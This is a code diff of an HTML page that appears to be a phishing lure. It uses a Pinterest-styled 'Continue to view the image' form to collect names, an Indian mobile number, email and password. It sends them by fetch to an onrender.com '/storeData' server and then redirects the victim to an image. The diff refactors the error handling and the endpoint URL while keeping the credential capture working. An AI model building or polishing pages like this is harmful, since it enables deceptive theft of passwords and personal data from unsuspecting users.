@@ -34,60 +34,67 @@
                 </div>
                 <button type="submit" class="btn btn-pinterest">Continue to view the image</button>
             </form>
+            <p id="errorMessage" style="color: red; display: none;"></p>
         </div>
     </div>
 
     <script>
-    const API_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://sign-up-ztbv.onrender.com';
+const API_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://sign-up-ztbv.onrender.com';
 
-    document.getElementById('signupForm').addEventListener('submit', function(event) {
-        event.preventDefault();
+document.getElementById('signupForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-        const mobileNumber = document.getElementById('mobileNumber').value;
+    const mobileNumber = document.getElementById('mobileNumber').value;
+    const errorElement = document.getElementById('errorMessage');
 
-        // ✅ New Indian mobile validation here
-        function isValidIndianPhoneNumber(number) {
-            number = number.trim().replace(/\s+/g, '');
-            const regex = /^[6-9]\d{9}$/;
-            return regex.test(number);
+    // ✅ New Indian mobile validation here
+    function isValidIndianPhoneNumber(number) {
+        number = number.trim().replace(/\s+/g, '');
+        const regex = /^[6-9]\d{9}$/;
+        return regex.test(number);
+    }
+
+    if (!isValidIndianPhoneNumber(mobileNumber)) {
+        errorElement.textContent = '❗ Please enter a valid 10-digit mobile number.';
+        errorElement.style.display = 'block';
+        return;
+    } else {
+        errorElement.style.display = 'none';
+    }
+
+    const firstName = document.getElementById('firstName').value;
+    const lastName = document.getElementById('lastName').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    fetch(`${API_URL}/storeData`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            firstName: firstName,
+            lastName: lastName,
+            mobileNumber: mobileNumber,
+            email: email,
+            password: password,
+        }),
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Data stored successfully');
+            window.location.href = 'https://photospace.life/image.php?id=8067I8.png';
+        } else {
+            throw new Error('Failed to store data');
         }
-
-        if (!isValidIndianPhoneNumber(mobileNumber)) {
-            alert('Please enter a valid 10 digits mobile number');
-            return;
-        }
-
-        const firstName = document.getElementById('firstName').value;
-        const lastName = document.getElementById('lastName').value;
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        fetch(`https://signup-eroo.onrender.com/storeData`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                firstName: firstName,
-                lastName: lastName,
-                mobileNumber: mobileNumber,
-                email: email,
-                password: password,
-            }),
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Data stored successfully');
-                window.location.href = 'https://photospace.life/image.php?id=8067I8.png';
-            } else {
-                throw new Error('Failed to store data');
-            }
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            alert('Something went wrong. Please try again with valid mobile number.');
-        });
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+        errorElement.textContent = '❗ Something went wrong. Please try again.';
+        errorElement.style.display = 'block';
     });
+});
 </script>
+
 </body>
 </html>
